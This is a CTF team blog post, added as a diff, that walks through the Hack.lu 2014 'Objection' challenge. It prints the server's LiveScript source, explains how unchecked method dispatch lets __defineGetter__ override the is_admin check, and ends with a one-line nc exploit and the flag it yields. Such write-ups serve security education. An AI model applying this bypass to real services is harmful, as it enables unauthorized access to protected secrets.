@@ -1,0 +1,399 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hack.lu 2014 - Objection - CaptchaFlag CTF Team</title>
+  <meta name="author" content="Captchaflag">
+
+  
+  <meta name="description" content="Challenge This guard talks a weird dialect. And why does he talk in such a complicated
+way?
+Download nc wildwildweb.fluxfingers.net 1408 Analysis &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-37376887-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
+  
+    <h2>Blog by the Captchaflag CTF Team</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.captchaflag.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Hack.lu 2014 - Objection</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-10-23T12:51:00-04:00" pubdate data-updated="true">Oct 23<span>rd</span>, 2014</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Challenge</h2>
+
+<p>This guard talks a weird dialect. And why does he talk in such a complicated
+way?
+<a href="https://wildwildweb.fluxfingers.net/static/chals/objection_4966674d17ff296939c0e3dfccfe87ed.co">Download</a></p>
+
+<p>nc wildwildweb.fluxfingers.net 1408</p>
+
+<h2>Analysis</h2>
+
+<p>Downloading the file gives us:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='coffeescript'><span class='line'><span class="nx">const</span> <span class="nv">net = </span><span class="nx">require</span> <span class="err">\</span><span class="nx">net</span>
+</span><span class='line'><span class="nx">const</span> <span class="nv">BufferStream = </span><span class="nx">require</span> <span class="err">\</span><span class="nx">bufferstream</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">admin_password = </span><span class="p">(</span><span class="nx">require</span> <span class="err">\</span><span class="nx">fs</span><span class="p">).</span><span class="nx">readFileSync</span> <span class="err">\</span><span class="nx">admin_password</span><span class="p">,</span> <span class="err">\</span><span class="nx">utf8</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="nv">server = </span><span class="nx">net</span><span class="p">.</span><span class="nx">createServer</span> <span class="nf">(con) -&gt;</span>
+</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&#39;client connected&#39;</span>
+</span><span class='line'>  <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&#39;hello!\n&#39;</span>
+</span><span class='line'>  <span class="nv">client_context =</span>
+</span><span class='line'>    <span class="nv">is_admin: </span><span class="kc">false</span>
+</span><span class='line'>    <span class="nv">token: </span><span class="p">(</span><span class="nx">require</span> <span class="err">\</span><span class="nx">fs</span><span class="p">).</span><span class="nx">readFileSync</span> <span class="err">\</span><span class="nx">secret_token</span><span class="p">,</span> <span class="err">\</span><span class="nx">utf8</span>
+</span><span class='line'>    <span class="nv">login: </span><span class="nf">([password], cb) -&gt;</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">password</span> <span class="o">==</span> <span class="nx">admin_password</span>
+</span><span class='line'>        <span class="nx">cb</span> <span class="s">&quot;Authentication successful&quot;</span>
+</span><span class='line'>        <span class="vi">@is_admin = </span><span class="kc">true</span>
+</span><span class='line'>      <span class="k">else</span>
+</span><span class='line'>        <span class="nx">cb</span> <span class="s">&quot;Authentication failed&quot;</span>
+</span><span class='line'>    <span class="nv">get_token: </span><span class="nf">([], cb) -&gt;</span>
+</span><span class='line'>      <span class="k">if</span> <span class="o">not</span> <span class="nx">@is_admin</span> <span class="k">then</span> <span class="k">return</span> <span class="nx">cb</span> <span class="s">&quot;You are not authorized to perform this action.&quot;</span>
+</span><span class='line'>      <span class="nx">cb</span> <span class="s">&quot;The current token is </span><span class="si">#{</span><span class="nx">@token</span><span class="si">}</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="nv">in_stream = </span><span class="k">new</span> <span class="nx">BufferStream</span> <span class="p">{</span><span class="nx">encoding</span><span class="o">:</span><span class="err">\</span><span class="nx">utf8</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span><span class="err">\</span><span class="nx">flexible</span><span class="p">}</span>
+</span><span class='line'>  <span class="nx">con</span><span class="p">.</span><span class="nx">pipe</span> <span class="nx">in_stream</span>
+</span><span class='line'>  <span class="o">&lt;-</span> <span class="nx">in_stream</span><span class="p">.</span><span class="nx">split</span> <span class="err">\\</span><span class="nx">n</span>
+</span><span class='line'>  <span class="nx">it</span> <span class="p">.</span><span class="o">=</span> <span class="nx">toString</span> <span class="err">\</span><span class="nx">utf8</span>
+</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&quot;got line: </span><span class="si">#{</span><span class="nx">it</span><span class="si">}</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="p">[</span><span class="nx">funcname</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">]</span> <span class="o">=</span> <span class="nx">it</span><span class="p">.</span><span class="nx">split</span> <span class="s">&#39; &#39;</span>
+</span><span class='line'>  <span class="k">if</span> <span class="k">typeof</span> <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="o">!=</span> <span class="err">\</span><span class="nx">function</span>
+</span><span class='line'>    <span class="k">return</span> <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;error: unknown function </span><span class="err">#</span><span class="s">funcname\n&quot;</span>
+</span><span class='line'>  <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="nx">args</span><span class="p">,</span> <span class="o">-&gt;</span>
+</span><span class='line'>    <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;</span><span class="err">#</span><span class="s">it\n&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">server</span><span class="p">.</span><span class="nx">listen</span> <span class="mi">1408</span><span class="p">,</span> <span class="o">-&gt;</span>
+</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&#39;server bound&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+<p>Clearly, we would like to get the token.  Calling <code>get_token()</code> requires knowing
+the admin password.  The key thing to notice is the follow bit of code where
+user input is parsed and used:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='coffeescript'><span class='line'>  <span class="nv">in_stream = </span><span class="k">new</span> <span class="nx">BufferStream</span> <span class="p">{</span><span class="nx">encoding</span><span class="o">:</span><span class="err">\</span><span class="nx">utf8</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span><span class="err">\</span><span class="nx">flexible</span><span class="p">}</span>
+</span><span class='line'>  <span class="nx">con</span><span class="p">.</span><span class="nx">pipe</span> <span class="nx">in_stream</span>
+</span><span class='line'>  <span class="o">&lt;-</span> <span class="nx">in_stream</span><span class="p">.</span><span class="nx">split</span> <span class="err">\\</span><span class="nx">n</span>
+</span><span class='line'>  <span class="nx">it</span> <span class="p">.</span><span class="o">=</span> <span class="nx">toString</span> <span class="err">\</span><span class="nx">utf8</span>
+</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&quot;got line: </span><span class="si">#{</span><span class="nx">it</span><span class="si">}</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="p">[</span><span class="nx">funcname</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">]</span> <span class="o">=</span> <span class="nx">it</span><span class="p">.</span><span class="nx">split</span> <span class="s">&#39; &#39;</span>
+</span><span class='line'>  <span class="k">if</span> <span class="k">typeof</span> <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="o">!=</span> <span class="err">\</span><span class="nx">function</span>
+</span><span class='line'>    <span class="k">return</span> <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;error: unknown function </span><span class="err">#</span><span class="s">funcname\n&quot;</span>
+</span><span class='line'>  <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="nx">args</span><span class="p">,</span> <span class="o">-&gt;</span>
+</span><span class='line'>    <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;</span><span class="err">#</span><span class="s">it\n&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+<p>The first word of input is checked to be a function of the <code>client_context</code>
+object.  Since this is turned into javascript, there will be many built-in
+methods we could call besides <code>get_token()</code> and <code>login()</code>.</p>
+
+<p>One method, <code>__defineGetter__</code> takes as parameters a property and a function
+body.  By overriding <code>is_admin</code> with the function: <code>-&gt; con.write &quot;#it\n</code>, the
+check in <code>get_token()</code> will not function as expected, and we will be able to see
+the token.</p>
+
+<h2>Solution</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='coffeescript'><span class='line'><span class="nx">$</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="s">&quot;__defineGetter__ is_admin\nget_token&quot;</span> <span class="o">|</span> <span class="nx">nc</span> <span class="nx">wildwildweb</span><span class="p">.</span><span class="nx">fluxfingers</span><span class="p">.</span><span class="nx">net</span> <span class="mi">1408</span>
+</span><span class='line'><span class="nx">hello</span><span class="o">!</span>
+</span><span class='line'><span class="kc">undefined</span>
+</span><span class='line'><span class="nx">The</span> <span class="nx">current</span> <span class="nx">token</span> <span class="o">is</span> <span class="nx">flag</span><span class="p">{</span><span class="nx">real_cowboys_dont_use_object_create_null</span><span class="p">}</span>
+</span><span class='line'><span class="nx">$</span>
+</span></code></pre></td></tr></table></div></figure>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">darby</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-10-23T12:51:00-04:00" pubdate data-updated="true">Oct 23<span>rd</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/web/'>web</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/" data-via="captchaflag" data-counturl="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/10/23/hack-dot-lu-2014-personnel-database/" title="Previous Post: Hack.lu 2014 - Personnel Database">&laquo; Hack.lu 2014 - Personnel Database</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/10/23/hack-dot-lu-2014-hidden-in-plain-sight/" title="Next Post: Hack.lu 2014 - Hidden in ρlaιn sιght">Hack.lu 2014 - Hidden in ρlaιn sιght &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton's Corporate Security Safe for Business</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("captchaflag", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
+  
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Captchaflag -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'captchaflag';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/';
+        var disqus_url = 'http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
